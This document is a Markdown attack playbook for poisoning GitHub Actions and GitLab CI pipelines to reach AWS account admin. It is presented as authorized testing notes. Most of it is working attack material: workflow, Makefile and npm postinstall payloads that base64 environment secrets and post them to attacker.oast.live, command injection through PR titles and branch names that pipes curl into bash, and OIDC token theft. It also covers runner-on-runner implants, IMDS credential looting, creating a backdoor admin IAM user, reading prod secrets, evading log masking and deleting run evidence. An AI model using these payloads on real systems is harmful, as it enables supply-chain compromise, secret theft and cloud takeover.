---
tags:
  - hack-notes
  - playbook
  - cicd
  - aws
---

# Poisoned CI Pipeline to Cloud Admin Playbook

> Abuse a CI/CD pipeline (GitHub Actions focus, GitLab CI notes) to run attacker code in the build, steal secrets and the pipeline's cloud identity, then ride an over-privileged OIDC role to cloud admin and production.

> **Attack graph position**
> **Fed by:** Entry point (commit or pull-request access to a repo).
> **Feeds into:** [AWS Leaked Key to IAM Privilege Escalation](AWS%20Leaked%20Key%20to%20IAM%20Privilege%20Escalation.md), [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md)
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance
| | |
|---|---|
| Goal | Turn write/PR access to a repo (or just a fork) into AWS account admin and production control |
| Starting position | External contributor able to open a PR from a fork, or a low-trust internal dev with branch/commit access |
| End state | Assumed an over-privileged IAM role via GitHub OIDC, optional persistence on a self-hosted runner, control of prod deploy |
| Key techniques | Poisoned Pipeline Execution (direct, indirect, public), T1195.002 Supply Chain Compromise, T1552.001/.005 Unsecured Credentials, T1078.004 Valid Cloud Accounts, T1648 Serverless/CI Execution |
| Prerequisites | A CI workflow that runs untrusted input or trusted local files, secrets/OIDC reachable from that job, a too-broad cloud trust policy or a non-ephemeral runner |
| Difficulty | Medium |
| Noise level | Moderate to Loud (every run, secret read, and role assumption is logged; quiet only if you blend with normal build traffic) |

## Attack Path
```
Recon workflows + triggers (.github/workflows, gato-x, Caminus)
  |
  v
Pick the PPE class:
  |-- DIRECT PPE  ---> you can push to a branch the pipeline runs --> edit the workflow itself
  |-- INDIRECT PPE -> you can change a file the pipeline trusts (Makefile, npm script, test config, lockfile)
  |-- PUBLIC PPE  --> fork PR hits pull_request_target / workflow_run, or script-injection via ${{ github.event.* }}
  |
  v
Execute attacker code in the build job
  |
  v
Dump env + secrets + request the GitHub OIDC token from the runner
  |
  v
  [decision] OIDC trust policy too broad?  ---YES--> aws sts assume-role-with-web-identity --> cloud creds
  |                                          |
  |                                          NO --> use leaked static keys / GITHUB_TOKEN / registry creds
  v
Assume over-privileged role --> enumerate --> escalate to account admin --> push prod deploy
  |
  v
  [fallback] Fork PR needs approval AND secrets are gated?
       --> pivot to indirect PPE via a trusted dependency/config
       --> or target a self-hosted runner: Runner-on-Runner persistence + lateral
```

## Prerequisites and Setup
- A GitHub account that can fork the target and open PRs, or write access to a branch in the target repo.
- A classic GitHub PAT with `repo` scope (read is enough for pure enumeration) exported as `GH_TOKEN` for tooling.
- Tooling: `gato-x` (`pipx install gato-x`), the `gh` CLI, `aws` CLI v2, `jq`, `curl`. Caminus as the pipeline/supply-chain scanner for the breadth pass.
- An attacker-controlled exfil sink (a webhook, an OAST listener, or a private repo issue body) for secrets that GitHub masks in logs.
- Authorization in scope to test the CI org, the fork-PR path, and the connected cloud account. Confirm prod is in scope before the final deploy step.

## Walkthrough

### Step 1. Recon the workflows, triggers, and runners
What and why: the trigger decides which PPE class is even possible. `pull_request_target`, `workflow_run`, and `issue_comment` run with the base repo's secrets; `pull_request` from a fork normally does not. Self-hosted runners and missing `permissions:` blocks are the high-value tells.

```bash
# Pull every workflow and read the triggers + runner labels
gh api repos/ORG/REPO/contents/.github/workflows --jq '.[].path'
for f in $(gh api repos/ORG/REPO/contents/.github/workflows --jq '.[].name'); do
  echo "== $f =="; gh api "repos/ORG/REPO/contents/.github/workflows/$f" --jq '.content' | base64 -d
done | grep -nE 'on:|pull_request_target|workflow_run|issue_comment|runs-on:|self-hosted|permissions:|secrets\.|\$\{\{'
```

```bash
# Fast static pass with gato-x: dangerous triggers, injection, TOCTOU, self-hosted runners
export GH_TOKEN=ghp_xxx
gato-x e -t ORG/REPO | tee gatox_repo.txt
# Org-wide sweep for the juicy patterns at scale (35-40k repos/hr on one PAT)
gato-x s -sg -q 'count:75000 /(issue_comment|pull_request_target|workflow_run)/ file:.github/workflows/ lang:yaml' -oT checks.txt
gato-x e -R checks.txt | tee gatox_org.txt
```

Run Caminus for the broader supply-chain view (unpinned action SHAs, mutable tags, OIDC config, GitLab `.gitlab-ci.yml` equivalents) so you do not miss a non-Actions pipeline.

Success signal: gato-x flags "Pwn Request", "Actions Injection", or "Self-Hosted Runner" on a repo; or you spot `pull_request_target` plus a `checkout` of `head.ref` plus a referenced `secrets.*`.

Decision: write access to a run branch -> Step 2 (direct). Only a trusted local file is editable -> Step 3 (indirect). Fork-only -> Step 4 (public PPE / injection).

GitLab note: read `.gitlab-ci.yml` and any `include:` files. The equivalents are protected-branch-only variables, `CI_JOB_TOKEN` scope, and runner tags. A merge-request pipeline that runs source from a fork with protected variables exposed is the GitLab analog of the `pull_request_target` mistake.

### Step 2. Direct PPE: edit the workflow on a branch the pipeline runs
What and why: if you can push to a branch whose `push`/`pull_request` event runs with secrets, the cheapest exploit is to edit the workflow itself to dump them. This is loud in diff review, so use it only where review is absent (personal automation repos, internal-only repos with no required reviewers).

```yaml
# .github/workflows/ci.yml  (add a step or a throwaway job on your branch)
      - name: cache warmer
        run: |
          env | base64 -w0 | curl -s -X POST --data-binary @- https://attacker.oast.live/e
          # OIDC token request (works only if the job declares id-token: write)
          curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" \
          | curl -s -X POST --data-binary @- https://attacker.oast.live/oidc
```

```bash
git checkout -b chore/cache-warmer
git commit -am "ci: cache warmer"; git push origin chore/cache-warmer
gh run watch --repo ORG/REPO   # watch the job fire
```

Success signal: the run goes green and your sink receives the base64 env blob and/or the OIDC JWT.

Decision: workflow edits require review or branch protection blocks the push -> drop to Step 3 (indirect) so the malicious code never touches the YAML.

### Step 3. Indirect PPE: inject via a file the pipeline already trusts
What and why: the workflow runs `make`, `npm`, or a test harness. Those read files in the repo that reviewers skim less carefully than the workflow YAML. Plant the payload in the build-time file, not the CI definition. Classic carriers: `Makefile`, `package.json` lifecycle scripts (`preinstall`/`postinstall`/`prepare`/`pretest`), `Dangerfile`, `conftest.py`, `.mocharc.js`, `tox.ini`, `setup.py`, webpack/babel config, or a lockfile pointing at a malicious version.

```makefile
# Makefile  -- the CI job runs `make test`
test:
	@env | base64 -w0 | curl -s --data-binary @- https://attacker.oast.live/e || true
	@curl -s -H "Authorization: bearer $$ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
	  "$$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" \
	  | curl -s --data-binary @- https://attacker.oast.live/oidc || true
	@$(MAKE) real-test
```

```json
// package.json -- CI runs `npm ci`, which executes lifecycle scripts
{
  "scripts": {
    "postinstall": "node -e \"require('child_process').execSync('env|base64|curl -s --data-binary @- https://attacker.oast.live/e')\""
  }
}
```

Success signal: the existing build job runs your code, secrets land in the sink, and the workflow YAML diff is clean.

Decision: even build-file changes get reviewed -> Step 4 uses untrusted input that needs no file change at all, or pivot to a self-hosted runner (Step 7).

### Step 4. Public PPE: fork PR into pull_request_target / workflow_run, or script injection
What and why: this path needs no write access. Two sub-cases.

4a. Pwn request: a `pull_request_target` or `workflow_run` workflow checks out and executes the fork's HEAD while holding base-repo secrets. Open a fork PR whose checked-out code carries the payload (drop it in the same build files as Step 3). Because the trigger runs in the base context, your forked code reads the real secrets.

4b. Script injection: untrusted `${{ github.event.* }}` is interpolated straight into a `run:` block. The expansion happens before the shell runs, so shell metacharacters in a PR title, branch name, issue body, or commit message become commands. This is the class behind the Nx s1ngularity attack (Aug 2025), which weaponized an unsanitized PR title plus `pull_request_target`.

```yaml
# Vulnerable workflow seen in the wild
      - run: echo "PR title: ${{ github.event.pull_request.title }}"
```

```bash
# Payload goes in the PR title (or branch name) of a fork PR
gh pr create --repo ORG/REPO --head attacker:inject \
  --title '$(env | base64 -w0 | curl -s --data-binary @- https://attacker.oast.live/e)' \
  --body 'docs typo fix'

# Branch-name variant for run blocks that interpolate github.head_ref
git checkout -b '$(curl -s https://attacker.oast.live/x|bash)'
git push origin HEAD
```

Success signal: the base-repo workflow runs (not your fork's) and your sink gets the secrets/OIDC token. For 4b the injected command appears mid-`run` in the (publicly viewable) job log.

Decision: fork PRs require maintainer approval before workflows run AND secrets are gated behind an `environment` reviewer -> see Step 8 (troubleshooting) and the pivots. Otherwise continue to Step 5.

### Step 5. Exfiltrate secrets and the cloud identity from the runner
What and why: collect everything the job can see. GitHub masks known secret values in logs, so do not just `echo`; base64 (or double-base64) and ship to your own sink, exactly as the tj-actions/changed-files (CVE-2025-30066) and reviewdog/action-setup (CVE-2025-30154) compromises did when they double-base64'd secrets to dodge log masking and dumped them into workflow logs.

```bash
# Inside the build step. Belt and braces: env, GitHub files, and the GITHUB_TOKEN.
env | base64 -w0 | curl -s --data-binary @- https://attacker.oast.live/env
cat "$GITHUB_ENV" "$GITHUB_OUTPUT" 2>/dev/null | base64 -w0 | curl -s --data-binary @- https://attacker.oast.live/ghenv
# GITHUB_TOKEN sits in the runner; check what it can do (contents:write? packages? id-token?)
curl -s -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/repos/ORG/REPO

# Request the OIDC ID token (requires permissions: id-token: write on the job)
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
echo "$OIDC" | cut -d. -f2 | base64 -d 2>/dev/null   # inspect claims: sub, aud, repository, ref
echo "$OIDC" | base64 -w0 | curl -s --data-binary @- https://attacker.oast.live/oidc
```

What to harvest, ranked by leverage:
- OIDC ID token with `aud=sts.amazonaws.com` (or `api://AzureADTokenExchange` / GCP audience). This is the cloud identity.
- Long-lived secrets in env: `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY`, `NPM_TOKEN`, `DOCKERHUB_TOKEN`, registry creds, `GH_PAT`.
- `GITHUB_TOKEN` itself: if `contents: write` or `packages: write`, you can poison releases/artifacts downstream.

Success signal: a valid JWT in your sink whose decoded `sub` reads something like `repo:ORG/REPO:ref:refs/heads/main` or `repo:ORG/REPO:pull_request`.

Decision: OIDC token present -> Step 6 (the high-value path). Only static AWS keys leaked -> skip to Step 6b and treat them as the cloud entry per [AWS Leaked Key to IAM Privilege Escalation](AWS%20Leaked%20Key%20to%20IAM%20Privilege%20Escalation.md).

### Step 6. Exchange OIDC for AWS creds against a too-broad trust policy
What and why: the runner's OIDC token is only useful if a role's trust policy will accept it. The common flaw is a wildcard `sub` (`repo:ORG/*`) or a missing/loose condition, so a token from ANY repo or branch in the org (including a fork-PR run or a throwaway repo you create in the org) is accepted. AWS now supports provider-specific claim validation, but plenty of trust policies still match on `sub` with `StringLike` and a wildcard.

```bash
# Decode the token to read sub/aud; then call STS directly with the raw JWT.
ROLE=arn:aws:iam::111122223333:role/github-actions-deploy
aws sts assume-role-with-web-identity \
  --role-arn "$ROLE" \
  --role-session-name ci-pwn \
  --web-identity-token "$OIDC" \
  --duration-seconds 3600 > creds.json

export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId creds.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey creds.json)
export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken creds.json)
aws sts get-caller-identity   # confirms the assumed role ARN
```

Wildcard hunting note: if you can read IAM (or via the assumed role), look for trust policies with `token.actions.githubusercontent.com:sub` set to `repo:ORG/*` or no `sub`/`aud` condition at all. A `repo:ORG/*` wildcard accepts `repo:ORG/anything:ref:...`, so creating a repo in the org (or a fork-PR run) yields an accepted token. The hardened form pins `aud` to `sts.amazonaws.com` with `StringEquals` and `sub` to the exact `repo:ORG/REPO:ref:refs/heads/main` with `StringLike` only where a controlled wildcard is needed.

6b. Static-key path: if only `AWS_ACCESS_KEY_ID`/`SECRET` leaked, configure them and proceed identically. Hand off to [AWS Leaked Key to IAM Privilege Escalation](AWS%20Leaked%20Key%20to%20IAM%20Privilege%20Escalation.md) for the key-to-admin escalation primitives.

Success signal: `get-caller-identity` returns the deploy role's ARN with a session you control.

Decision: STS returns `AccessDenied` (`Not authorized to perform sts:AssumeRoleWithWebIdentity`) -> the trust policy is correctly scoped; you cannot use this token. Fall back to leaked static keys, the GITHUB_TOKEN abuse path, or a self-hosted runner (Step 7).

### Step 7. Self-hosted runner takeover (major variant): persistence and lateral movement
What and why: self-hosted runners run on the target's own infrastructure (often a VM or container inside the corporate/cloud network), frequently non-ephemeral, and frequently reused across jobs. Code execution on one means: persistence between jobs, theft of every secret that flows through it, and a foothold inside the network the runner lives in. Adnan Khan and John Stawinski's bug-bounty campaign automated this as the Runner-on-Runner (RoR) technique: register a second attacker-controlled runner as an implant on the existing runner.

```bash
# Gato-X automates the full RoR chain via a fork PR or push workflow.
export GH_TOKEN=ghp_xxx
# Confirm the target uses a self-hosted runner first (from Step 1 enumeration)
gato-x a --runner-on-runner --target ORG/REPO \
  --target-os linux --target-arch x64 --keep-alive
# --keep-alive holds the workflow open on NON-ephemeral runners.
# On success gato-x drops to an interactive prompt that runs shell on the runner.
```

```bash
# Manual minimal implant if you already have execution on the runner:
# pull a fresh runner registration token via the GITHUB_TOKEN or a PAT, then
./config.sh --url https://github.com/ORG --token <REG_TOKEN> --name impl --unattended &
./run.sh &   # second runner; survives the original job, picks up future jobs/secrets
```

Once on the runner, enumerate the host identity. A cloud-hosted runner usually has an instance profile or workload identity:

```bash
# AWS instance metadata (IMDSv2) from the runner host
TOK=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl -s -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
# Loot persisted runner state for cross-job secrets
ls -la /home/runner/work/_temp /home/runner/.cache 2>/dev/null
cat /home/runner/.credentials 2>/dev/null
```

Success signal: an interactive shell on the runner (gato-x prompt) and either IMDS creds or a registered second runner that survives the job.

Decision: runner is ephemeral (re-imaged per job) -> no persistence; grab secrets in-job only and pivot to the cloud creds. Runner is non-ephemeral -> keep the implant and lateral into the network per [Kubernetes and Container Breakout](../Cheatsheets/Kubernetes%20and%20Container%20Breakout.md) / [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md).

### Step 8. Assume the over-privileged role, enumerate, escalate to account admin
What and why: deploy roles are routinely over-scoped (`iam:*`, `AdministratorAccess`, or `PassRole` to a privileged role). With the assumed session from Step 6/7, enumerate, then take the shortest admin path.

```bash
# Who am I and what can I do
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name github-actions-deploy
aws iam get-role-policy --role-name github-actions-deploy --policy-name inline 2>/dev/null

# Common escalations (any ONE is game over):
# 1. iam:AttachRolePolicy / PutUserPolicy -> attach AdministratorAccess to a principal you control
aws iam create-user --user-name svc-backup
aws iam attach-user-policy --user-name svc-backup \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name svc-backup   # durable creds, survives the OIDC session

# 2. iam:PassRole + a service that runs code (Lambda/EC2/Glue) -> run as a higher role
# 3. iam:CreatePolicyVersion --set-as-default -> rewrite an attached policy in place
```

Then reach production: read the prod state and push a deploy.

```bash
aws s3 ls; aws secretsmanager list-secrets --query 'SecretList[].Name'
aws secretsmanager get-secret-value --secret-id prod/db --query SecretString --output text
# Prod control via the pipeline's own deploy surface (ECS/EKS/Lambda/S3 site)
aws ecs update-service --cluster prod --service web --force-new-deployment
```

Success signal: durable IAM access keys outside the time-boxed OIDC session, read of prod secrets, and a deploy you initiated. Stop at the proven primitive: demonstrate prod write capability, do not destroy or exfiltrate customer data.

Decision: the deploy role is tightly scoped (e.g. only `s3:PutObject` to one bucket) -> chain that narrow permission (poison an artifact the next deploy trusts, or write to a Lambda code bucket) rather than forcing a privesc that is not there. See [AWS Cloud Penetration Test](../Checklists/AWS%20Cloud%20Penetration%20Test.md) for the enumeration and escalation matrix.

## OPSEC and Detection
- Workflow-run logs: every run you trigger is in the Actions tab with your branch/PR and the job log. Injected commands in a `run:` step are visible in the (often public) log. Defenders grep logs for `curl|base64|169.254.169.254|oast` and for jobs that run unusually long or hit egress they should not.
- Secret access: GitHub records secret usage per run; an environment-gated secret read shows the approver. tj-actions/reviewdog detection focused on anomalous `base64`/double-encoded blobs and outbound connections from runners.
- New IAM role assumption: CloudTrail `AssumeRoleWithWebIdentity` events show the `sub`/`aud` and source. A first-ever assumption of a role from a new `sub` (a different repo/branch, or a fork-PR run) is a high-fidelity alert. GuardDuty flags credential use from an unexpected ASN if you run STS off-runner.
- Anomalous build commands: SOCs increasingly diff the workflow/`Makefile`/`package.json` against history and alert on new network egress, new lifecycle scripts, or a `pull_request_target` job checking out `head.ref`.
- Runner process anomalies: a second `Runner.Listener`/`run.sh` process, an unexpected `config.sh --unattended`, or outbound to GitHub from a runner that should be idle are the RoR tells. EDR on the runner catches the implant.
- Noise reduction: prefer indirect PPE (clean YAML diff) over direct edits; exfil through a single benign-looking HTTPS POST; assume the role from the runner itself (expected source IP) rather than from your own host; keep sessions short and avoid creating obviously named IAM users.

## Cleanup
- Delete the malicious branch and PR: `git push origin --delete <branch>`; `gh pr close <num> --repo ORG/REPO --delete-branch`.
- Delete the workflow runs that hold your payload/log evidence: `gh run delete <run-id> --repo ORG/REPO` (needs `actions:write`).
- Remove any second runner you registered: `./config.sh remove --token <REG_TOKEN>` and kill the `run.sh`/`Runner.Listener` processes; delete dropped implant files under `/home/runner`.
- Remove cloud persistence you created: delete the IAM user/keys (`aws iam delete-access-key`; `aws iam delete-user`), any policy versions you added, and any test resources (Lambdas, roles).
- Rotate guidance for the report: every secret the job exposed must be treated as compromised and rotated (cloud keys, PATs, npm/registry tokens, signing keys), and the OIDC trust policy tightened.
- Document the exfil sink and tear it down. Note exact timestamps so the blue team can scope log review.

## Troubleshooting
- Fork PR workflows do not run: the repo requires approval for first-time/outside contributors (`Require approval for all outside collaborators`). Pivot to indirect PPE via a dependency/config that a maintainer will merge, or target a self-hosted runner whose enumeration does not need the workflow to fire.
- Secrets are empty / not in env: they are gated behind a GitHub `environment` with required reviewers, or the job simply does not reference them. Re-read the workflow for which job holds the secret and target that job specifically; environment-gated deploys often run only on `push` to `main`, so an indirect PPE merged to main is the route.
- `id-token` request fails (`Unable to get ACTIONS_ID_TOKEN_REQUEST_URL`): the job lacks `permissions: id-token: write`. No OIDC token from this job. Look for another workflow that does declare it, or fall back to leaked static keys.
- STS returns `AccessDenied` on `AssumeRoleWithWebIdentity`: trust policy `sub`/`aud` is correctly scoped to a repo/branch you do not control. Try a token from the exact matching `sub` (the right repo+branch), or abandon OIDC for static keys / GITHUB_TOKEN abuse.
- Ephemeral runners: re-imaged each job, so no persistence. Treat each run as one-shot, grab the secrets and cloud token in-job, and move to the cloud immediately.
- Branch protection blocks your push: you cannot do direct PPE. Indirect PPE through a reviewed-but-skimmed file, or the public fork-PR path, are the alternatives.
- Log masking hides your secret: GitHub masks known secret strings. Base64 or double-base64 before exfil (the tj-actions/reviewdog technique) so the value never appears verbatim in the log.

## Variations and Pivots
- Mutable-tag / unpinned action supply chain: if the target uses `uses: some/action@v1` (a tag, not a SHA), compromise of that action (the tj-actions/changed-files CVE-2025-30066 pattern, enabled by reviewdog CVE-2025-30154) injects into every downstream pipeline at once. Pin to SHAs is the fix; abuse the lack of it where present.
- `workflow_run` chaining: a low-trust `pull_request` workflow uploads an artifact, and a privileged `workflow_run` workflow consumes it with secrets. Poison the artifact in the first to execute in the second.
- GITHUB_TOKEN with `contents: write` or `packages: write`: poison a release, container image, or package that other pipelines and prod pull, turning one build into a supply-chain implant.
- Azure / GCP federation: the same OIDC pattern applies. Swap `aud` to `api://AzureADTokenExchange` (Entra workload identity federation) or the GCP workload-identity-pool audience, then `az login --federated-token` / `gcloud auth login --cred-file`. See [Azure and M365 Entra ID](../Checklists/Azure%20and%20M365%20Entra%20ID.md) / [GCP Cloud Penetration Test](../Checklists/GCP%20Cloud%20Penetration%20Test.md).
- GitLab CI: protected variables exposed to a fork merge-request pipeline, or a `CI_JOB_TOKEN` with broad cross-project scope, give the same secret-theft and lateral primitives.
- From cloud admin, chain into a full account walkthrough with [AWS Cloud Penetration Test](../Checklists/AWS%20Cloud%20Penetration%20Test.md); from a runner foothold inside a cluster, chain into [Kubernetes and Container Breakout](../Cheatsheets/Kubernetes%20and%20Container%20Breakout.md).

## Related
- Checklists: [CICD Pipeline](../Checklists/CICD%20Pipeline.md), [AWS Cloud Penetration Test](../Checklists/AWS%20Cloud%20Penetration%20Test.md), [Kubernetes and Containers](../Checklists/Kubernetes%20and%20Containers.md)
- Cheatsheets: [CICD and Supply Chain](../Cheatsheets/CICD%20and%20Supply%20Chain.md), [AWS Pentest](../Cheatsheets/AWS%20Pentest.md), [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md)
- Tools: Caminus
- Playbooks: [AWS Leaked Key to IAM Privilege Escalation](AWS%20Leaked%20Key%20to%20IAM%20Privilege%20Escalation.md)
